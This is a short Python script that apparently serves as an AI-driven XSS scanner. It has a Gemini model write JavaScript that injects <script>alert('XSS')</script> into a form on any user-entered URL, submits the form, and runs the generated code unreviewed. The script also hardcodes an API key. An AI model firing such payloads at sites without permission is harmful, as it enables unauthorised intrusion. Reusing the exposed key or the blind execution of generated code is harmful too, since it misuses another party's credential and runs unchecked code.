import google.generativeai as genai
from playwright.sync_api import sync_playwright
import time

# Setup
API_KEY = "AIzaSyAk9XcBZ9vK3JZbyZutskVVrD7_7No02G0"
genai.configure(api_key=API_KEY)
ai = genai.GenerativeModel('gemini-2.5-flash-preview-09-2025')

def ask_ai(question):
    """Ask AI and get response"""
    return ai.generate_content(question).text

def run_js(page, code):
    """Clean and run JavaScript code"""
    code = code.replace('```javascript', '').replace('```js', '').replace('```', '').strip()
    try:
        return page.evaluate(code)
    except Exception as e:
        return f"Error: {e}"

def scan(url):
    """AI-Powered XSS Scanner"""
    print("\n🤖 AI XSS SCANNER\n" + "="*50)
    
    # Open browser
    pw = sync_playwright().start()
    browser = pw.chromium.launch(
        headless=False,
        executable_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    )
    page = browser.new_page()
    
    # Track alerts
    alerts = []
    page.on("dialog", lambda d: (alerts.append(d.message), d.accept()))
    
    try:
        # Go to target
        print(f"🌐 Loading: {url}")
        page.goto(url, timeout=30000)
        time.sleep(1)
        
        # Get page info
        html = page.content()[:3000]
        text = page.evaluate("document.body.innerText")[:2000]
        
        # AI STEP 1: Analyze page and create scan code
        print("🧠 AI analyzing page...")
        code1 = ask_ai(f"""
Target: {url}
HTML: {html}
Text: {text}

Write JavaScript to find all input fields and return as JSON array.
ONLY CODE, NO EXPLANATIONS:
""")
        
        inputs = run_js(page, code1)
        print(f"✅ Found: {inputs}\n")
        
        # AI STEP 2: Create attack code
        print("💉 AI creating attack...")
        code2 = ask_ai(f"""
Target: {url}
Inputs found: {inputs}

Write JavaScript to:
1. Select best input field
2. Inject XSS payload: <script>alert('XSS')</script>
3. Submit the form

ONLY JAVASCRIPT CODE:
""")
        
        print("🚀 Executing attack...")
        result = run_js(page, code2)
        print(f"   {result}")
        time.sleep(2)
        
        # AI STEP 3: Analyze results
        print("\n🔍 AI analyzing results...")
        new_html = page.content()[:3000]
        new_text = page.evaluate("document.body.innerText")[:2000]
        
        verdict = ask_ai(f"""
SECURITY ANALYSIS:

Before Attack:
{text[:500]}

After Attack:
{new_text[:500]}

Alerts Triggered: {len(alerts)}
Alert Messages: {alerts}

HTML Changes: {len(html)} → {len(new_html)} chars

Is this XSS vulnerable? 
Answer: VULNERABLE or SAFE
Confidence: HIGH/MEDIUM/LOW
Evidence: (brief)
""")
        
        # Results
        print("\n" + "="*50)
        print("🎯 VERDICT")
        print("="*50)
        print(verdict)
        
        if alerts:
            print(f"\n🚨 ALERT CONFIRMED: {alerts[0]}")
            page.screenshot(path="vuln.png")
            print("📸 Screenshot: vuln.png")
        
        print("\n✅ Scan complete!")
        input("\nPress Enter to close...")
        
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        browser.close()
        pw.stop()

# Run
if __name__ == "__main__":
    url = input("🎯 Target URL: ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    scan(url)

